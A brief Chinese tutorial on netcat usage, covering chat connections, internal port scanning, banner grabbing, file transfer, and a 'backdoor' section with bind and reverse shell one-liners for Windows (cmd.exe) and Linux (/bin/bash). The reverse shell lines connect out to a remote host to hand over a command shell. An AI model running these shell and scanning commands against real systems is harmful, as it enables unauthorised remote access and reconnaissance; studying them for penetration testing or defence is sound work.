话不多说直接上干货。

## NC的使用场景

###
![](https://image.3001.net/images/20210525/1621931489_60acb5e142f7884bbf087.png!small)

### 实现简单的通信，但是不能对机器执行命令，方法如下：

创建一个服务器端方法：

    
    
    - nc -l -p [localport]

创建一个客户端方法（连接服务端）：

    
    
    - nc [remote_addr] [remoteport]

对目标内网的扫描：

    
    
    - nc -v -n  -z -w1 [target_ip] [start_target_port-stop_target_port]

> -v 表示对错误进行详细输出
>
> -n 不对目标机器进行DNS解析
>
> -z zero I/O 模式，专用于端口扫描。表示对目标IP发送的数据表中不包含任何payload，这样做可以加快扫描的速度。
>
> -w1 超时设置为1秒。

抓取Banner信息：

    
    
    -echo “ ” | nc -v -n -w1 [target_ip] [start_target_port-stop_target_port]

## 使用NC建立后门

### Windows后门

监听型后门：

    
    
    - nc -l -p 4444 -e cmd.exe

连接型后门

    
    
    - nc [remote_ip] [remote_port] -e cmd.exe

无论是何种后门，都需要使用-e cmd.exe 来返回对应的cmd.exe

### Linux后门

监听型后门：

    
    
    - nc -l -p 4444 -e /bin/bash

连接型后门

    
    
    - nc [remote_ip] [remote_port] -e /bin/bash

无论是何种后门，都需要使用-e /bin/bash 来返回对应的shell。

## 服务端与客户端进行文件传输

客户端向服务端传输文件：

### 创建一个服务器端方法

    
    
    - nc -l -p [localport]  < outfile[文件名]

创建一个客户端方法（连接服务端）：

    
    
    - nc [remote_addr] [remoteport] > infile

### 服务端向客户端传输数据

创建一个服务器端方法：

    
    
    - nc -l -p [localport] < infile

创建一个客户端方法（连接服务端）：

    
    
    - nc [remote_addr] [remoteport] > outfile

如果此时服务端并没有准备好连接，而客户端已经使用nc进行连接，那么客户端会一直等待下去，直到连接上服务端，造成一种“假死”状态。

解决方法：设置等待时间。

    
    
    - nc -w3 [ip] [port]  

设置等待3秒钟，超过3秒钟，客户端直接关闭等待连接。

